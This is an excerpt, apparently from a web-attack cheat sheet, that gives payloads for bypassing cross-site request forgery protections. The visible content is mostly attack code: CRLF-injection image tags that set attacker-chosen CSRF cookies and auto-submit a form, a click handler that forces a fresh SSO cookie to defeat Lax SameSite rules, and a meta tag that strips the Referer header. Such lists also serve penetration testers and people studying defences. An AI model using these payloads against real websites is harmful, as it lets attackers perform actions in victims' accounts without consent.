...
* **Payload:** `<img src="https://url/?search=test%0d%0aSet-Cookie:%20csrfKey=KEY%3b%20SameSite=None" onerror="document.forms[0].submit()">`

### Token Is Simply Duplicated in a Cookie <sup><sub>(Double Submit)<sub></sup>
...
* **Payload :** `<img src="https://url/?search=test%0d%0aSet-Cookie:%20csrf=hacked%3b%20SameSite=None" onerror="document.forms[0].submit()">`
...
### Bypass Lax Restrictions Using GET Requests
...
## Bypass Lax Restrictions with Newly Issued Cookies
...
* **Payload :** `window.onclick = () => {window.open('https://vulnerable-website.com/login/sso');}`
...
* **Payload :** `<meta name="referrer" content="never">`
